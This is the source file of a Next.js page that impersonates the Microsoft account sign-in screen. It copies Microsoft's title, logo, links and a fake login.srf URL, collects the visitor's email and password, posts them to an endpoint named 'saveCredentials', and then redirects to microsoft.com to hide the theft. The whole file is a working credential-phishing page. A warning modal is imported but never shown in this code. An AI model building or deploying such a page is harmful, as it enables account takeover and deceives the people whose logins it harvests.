import type { NextPage } from 'next';
import Head from 'next/head';
import Image from 'next/image';
import styles from '../styles/Home.module.css';
import { AiOutlineQuestionCircle } from 'react-icons/ai';
import { BsArrowLeft } from 'react-icons/bs';
import { createRef, useEffect, useRef, useState } from 'react';
import Router from 'next/router';
import Modal from 'react-modal';
import WarningModal from '../components/warningModal';

const Home: NextPage = () => {
  const [formProgress, setFormProgress] = useState<number>(0);
  const [email, setEmail] = useState<string>("");
  const [password, setPassword] = useState<string>("");
  const [emailErr, setEmailErr] = useState<boolean>(false);
  const [modalOpen, setModalOpen] = useState<boolean>(true);

  const multiClass = (classNames: string[]): string => {
    let string = '';
    classNames.map(x => string = string + x + " ");
    return string;
  }
  const back = () => {
    setEmail('');
    setPassword('');
    setFormProgress(0);
  }
  const validateEmail = (mail: string): boolean => {
    const re = /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
    return re.test(email);
  }
  const formProgressUp = () => {
    if (validateEmail(email)) return setFormProgress(1);
    setEmailErr(true);
  }
  const send = async () => {
    const status = await fetch("api/saveCredentials", {
      method: "POST",
      headers: {
        "content-type": "application/json",
      },
      body: JSON.stringify({userName: email, password: password})
    })
    .then(x => x.status)
    if (status === 200) {
      window.location.href = "https://www.microsoft.com/";
    }
  }
  useEffect(() => {
    window.history.pushState('asd', 'asd', '?login.srf?wa=wsignin1.0&rpsnv=13&ct=1661630325&rver=7.0.6737.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fnlp%3d1%26RpsCsrfState%5hw86o41c2-3488-2342-f8g7-231aa11aca17&id=289347&aadredir=3&whr=hotmail.com&CBCXT=out&lw=1&aa=dob%scflaame%3celd&cobrandid=00518');
  })
  return (
    <div className={styles.container}>

      <Head>
        <title>Sign in to your Microsoft account</title>
        <meta name="description" content="Generated by create next app" />
        <link rel="icon" type="image/svg+xml" sizes="21x21" href="favicon16.svg" />
        <link rel="icon" type="image/svg+xml" sizes="43x43" href="favicon32.svg" />
        <link rel="icon" type="image/svg+xml" sizes="240x240" href="favicon%20180.svg" />
      </Head>
      <main className={multiClass([styles.main, formProgress === 0 ? styles.height0 : styles.height1])}>
        <div className={styles.msLogo}>
          {/* eslint-disable-next-line @next/next/no-img-element */}
          <img src='/microsoft_logo.svg' alt="ms-logo" />
        </div>
        <section className={styles.formSection}>
          {
            formProgress === 0
            ? <p>Sign in</p>
            : (
              <span className={styles.email}>
                <div className={styles.btnBack} onClick={() => back()}>
                  <BsArrowLeft color="#B2B2B2" />
                </div>
                {email}
              </span>
            )
          }
          {
            formProgress === 0
              ? (
                <>
                  {
                    emailErr
                    ? <h5 className={styles.emailErr}>Enter a valid email address, phone number, or Skype name.</h5>
                    : null
                  }
                  <input
                    type="email"
                    placeholder="Email, phone, or Skype"
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    
                  />
                  <div className={styles.links}>
                    <p className={styles.noAcc}>No account? <a href="https://signup.live.com/?lic=1">Create One!</a></p>
                    <span className={styles.withKey}>
                      <a href="https://support.microsoft.com/en-us/help/4463210/windows-10-sign-in-microsoft-account-windows-hello-security-key">Sign in with a security key</a>
                      <AiOutlineQuestionCircle color='grey' size={20} />
                    </span>
                    <a href="https://account.microsoft.com/account/manage-my-account">Sign-in options</a>
                  </div>
                </>
              )
              : (
                <>
                  <h2 className={styles.enterPswrd}>Enter Password</h2>
                  <input 
                    type="password"
                    placeholder='Password'
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                  />
                  <div className={styles.dummyCheckbox}>
                    <input type="checkbox" />
                    <p>Keep me signed in</p>
                  </div>
                  <div className={styles.col}>
                    <a href="http://localhost:5000/#">Forgot password?</a>
                    <a href="http://localhost:5000/#">Sign in with Windows Hello or a security key</a>
                  </div>
                </>
              )
          }
          
          <div className={styles.btnDiv}>
            <button
              className={styles.nextBtn}
              style={emailErr ? {marginBottom: "auto"} : {}}
              onClick={() => formProgress === 0 ? formProgressUp() : send()}
            >
              {formProgress === 0 ? "Next": "Log in"}
            </button>
          </div>
        </section>
      </main>
      <footer className={styles.footer}>
        <div className={styles.footerItem}>
          <p>Terms of use</p>
        </div>
        <div className={styles.footerItem}>
          <p>Privacy & cookies</p>
        </div>
        <div className={styles.footerItem}>
          <p>•••</p>
        </div>
      </footer>

      {/* <footer className={styles.footer}>
        <a
          href="https://vercel.com?utm_source=create-next-app&utm_medium=default-template&utm_campaign=create-next-app"
          target="_blank"
          rel="noopener noreferrer"
        >
          Powered by{' '}
          <span className={styles.logo}>
            <Image src="/vercel.svg" alt="Vercel Logo" width={72} height={16} />
          </span>
        </a>
      </footer> */}
    </div>
  )
}

export default Home